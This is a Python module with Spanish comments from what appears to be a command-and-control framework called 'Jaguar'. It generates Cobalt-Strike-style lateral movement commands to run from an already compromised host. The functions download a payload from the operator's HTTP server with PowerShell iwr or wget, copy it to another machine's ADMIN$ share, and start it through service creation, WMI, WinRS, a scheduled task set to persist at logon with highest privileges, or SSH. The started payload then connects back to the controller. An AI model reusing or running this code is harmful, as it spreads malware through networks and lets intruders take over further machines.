# -*- coding: utf-8 -*-
"""lateral.py — movimiento lateral estilo Cobalt Strike (jump / remote-exec).

Genera cadenas de comandos que se ejecutan EN UN CLIENTE YA COMPROMETIDO
(handler 'shell' del agente) para desplegar el payload en OTRO host. Cuando el
payload arranca, conecta solo al controlador -> aparece como cliente nuevo.

Flujo (mismo espiritu que 'jump' de Cobalt Strike):
  1) el cliente pivote descarga el payload desde el HTTP del operador
  2) lo copia al destino por SMB (ADMIN$)
  3) lo lanza con la tecnica elegida

Tecnicas y su equivalente en Cobalt Strike:
  psexec   -> jump psexec      (SCM: sc create + sc start)
  smbexec  -> remote-exec smb  (servicio que ejecuta cmd)
  wmiexec  -> jump wmi         (WMI Win32_Process.Create)
  winrm    -> jump winrm       (WinRS / PowerShell Remoting)
  schtasks -> persistencia + ejecucion por tarea programada
  ssh      -> hosts Linux

NOTA sobre `ssh`: la cadena de Linux NO pasa por ADMIN$ (que es SMB/Windows),
así que `lanzar()` recibe la URL aparte. Ése era el origen del NameError
histórico (`url_payload_ssh` sin definir); ahora existen las dos funciones,
`url_payload()` y su alias `url_payload_ssh()`, y `comando_completo()` pasa la
URL siempre.
"""

TECNICAS = ["psexec", "smbexec", "wmiexec", "winrm", "schtasks", "ssh"]

# Técnicas que sólo funcionan contra Windows.
TECNICAS_WINDOWS = ("psexec", "smbexec", "wmiexec", "winrm", "schtasks")

INFO = {
    "psexec":   "SCM: sc create/start (deja servicio en el registro)",
    "smbexec":  "servicio que ejecuta cmd (semi-fileless)",
    "wmiexec":  "WMI Win32_Process.Create (sin servicio)",
    "winrm":    "WinRS / PowerShell Remoting (5985/5986)",
    "schtasks": "tarea programada ONLOGON + /run (persiste)",
    "ssh":      "destinos Linux por SSH",
}

# Puerto por defecto del servicio que se crea, útil para el limpiar().
SERVICIO_DEFECTO = "JaguarSvc"


def url_payload(host, puerto_http, nombre_exe):
    """URL HTTP desde la que el pivote descargará el payload."""
    return f"http://{host}:{puerto_http}/{nombre_exe}"


def url_payload_ssh(host, puerto_http, nombre_exe):
    """Alias histórico de url_payload(). Se mantiene por compatibilidad: el
    bug original era llamar a este nombre cuando no existía."""
    return url_payload(host, puerto_http, nombre_exe)


def comando_descarga_linux(url, exe):
    """Descarga + chmod + arranque en segundo plano, para destinos Linux."""
    return (f"wget -qO /tmp/{exe} {url} && chmod +x /tmp/{exe} && "
            f"nohup /tmp/{exe} >/dev/null 2>&1 &")


def copiar(target, url, exe):
    """Descarga el payload en el pivote y lo copia al ADMIN$ del destino."""
    return (f'powershell -NoP -C "iwr -UseBasicParsing \'{url}\' -OutFile $env:TEMP\\{exe}"'
            f' && copy /Y "%TEMP%\\{exe}" "\\\\{target}\\ADMIN$\\{exe}"')


def lanzar(tecnica, target, exe, servicio=SERVICIO_DEFECTO, usuario="",
           password="", url=""):
    """Cadena de lanzamiento remoto. 'url' solo se usa con ssh.

    Lanza ValueError si la técnica no existe (antes se colaba hasta un
    'tecnica desconocida' tras haber construido media cadena).
    """
    if tecnica not in TECNICAS:
        raise ValueError(f"tecnica desconocida: {tecnica}")
    if tecnica == "psexec":
        return (f'sc \\\\{target} create {servicio} binPath= "C:\\Windows\\{exe}" start= auto'
                f' && sc \\\\{target} start {servicio}')
    if tecnica == "smbexec":
        return (f'sc \\\\{target} create {servicio} binPath= "cmd /c C:\\Windows\\{exe}" start= auto'
                f' && sc \\\\{target} start {servicio}')
    if tecnica == "wmiexec":
        return f'wmic /node:{target} process call create "C:\\Windows\\{exe}"'
    if tecnica == "winrm":
        cred = f' -u:{usuario} -p:{password}' if usuario else ""
        return f'winrs{cred} -r:{target} "C:\\Windows\\{exe}"'
    if tecnica == "schtasks":
        return (f'schtasks /s {target} /create /tn {servicio} /tr "C:\\Windows\\{exe}" '
                f'/sc ONLOGON /rl HIGHEST /f && schtasks /s {target} /run /tn {servicio}')
    # ssh
    if not url:
        raise ValueError("la tecnica ssh necesita la URL del payload")
    return (f'ssh {usuario or "root"}@{target} "'
            + comando_descarga_linux(url, exe) + '"')


def comando_completo(tecnica, target, url, exe="Jaguar.exe",
                     servicio=SERVICIO_DEFECTO, usuario="", password=""):
    """Cadena lista para enviar por el handler 'shell' del agente pivote.

    Para ssh no se copia a ADMIN$: el destino Linux descarga él mismo.
    """
    if tecnica not in TECNICAS:
        raise ValueError(f"tecnica desconocida: {tecnica}")
    if tecnica == "ssh":
        return (f'ssh {usuario or "root"}@{target} "'
                + comando_descarga_linux(url, exe) + '"')
    return copiar(target, url, exe) + " && " + lanzar(
        tecnica, target, exe, servicio, usuario, password, url)


def limpiar(tecnica, target, servicio=SERVICIO_DEFECTO):
    """Cadena para deshacer lo que dejó la técnica (servicio o tarea)."""
    if tecnica in ("psexec", "smbexec"):
        return f'sc \\\\{target} delete {servicio}'
    if tecnica == "schtasks":
        return f'schtasks /s {target} /delete /tn {servicio} /f'
    if tecnica == "ssh":
        return f'ssh {target} "pkill -f Jaguar"'
    return ""